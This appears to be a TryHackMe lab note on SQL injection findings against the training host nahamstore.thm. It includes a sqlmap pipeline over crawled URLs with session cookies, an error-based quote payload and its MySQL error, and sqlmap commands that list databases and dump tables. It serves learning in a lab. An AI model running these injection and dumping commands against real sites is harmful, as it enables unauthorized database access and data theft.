---
title: SQL Injection
date: 2026-07-23
tags:
  - thm
  - nahamstore
  - sqli
  - sqlmap
  - vulnerability
publish: false
draft: false
description: "SQL Injection findings on nahamstore.thm"
---

# SQL Injection

## GoSpider to SQLMap Pipeline

```bash
cat urls_with_params.txt | \
  while read url; do
    sqlmap -u "$url" --batch \
      --cookie "token=0cb0741c0fee47a28677c86a5cdc7ad9; session=fc693089480001fa764e1e5f72eae2c2" \
      --level=2 --risk=2 \
      --output-dir=sqlmap_out/
  done
```

## SQLi-Vulnerable Parameters Found

1. `http://nahamstore.thm/product?id=2` (GET, id parameter)
2. `http://nahamstore.thm/product?id=2&name=Sticker+Pack` (GET, id parameter)
3. `http://nahamstore.thm/product?id=2&added=1` (GET, id parameter)

## Error-Based SQLi

**Vulnerable URL:**
`http://nahamstore.thm/product?id='`

**Error message:**
```
You have an error in your SQL syntax; check the manual that corresponds to 
your MySQL server version for the right syntax to use near '' LIMIT 1' at line 1
```

**Database Server:** MySQL

**Possible backend query:**
```sql
SELECT something FROM product_table WHERE id = '1'
```

**After injecting payload:**
```sql
SELECT something FROM product_table WHERE id = '''
```
Throws error because of 3 single quotes.

### SQLMap Data Extraction

```bash
# List databases
sqlmap -u "http://nahamstore.thm/product?id=1" --dbs

# Dump specific table
sqlmap -u "http://nahamstore.thm/product?id=1" -D nahamstore -T product --dump
```

## Blind SQLi in Multipart POST Request

**Method:** Save the request in a file and run sqlmap:

```bash
sqlmap -r request5.txt --dbs
sqlmap -r request5.txt -D nahamstore --tables
```

**Note:** Original notes contained screenshots of dumped CSV results (embedded images in CherryNotes source).
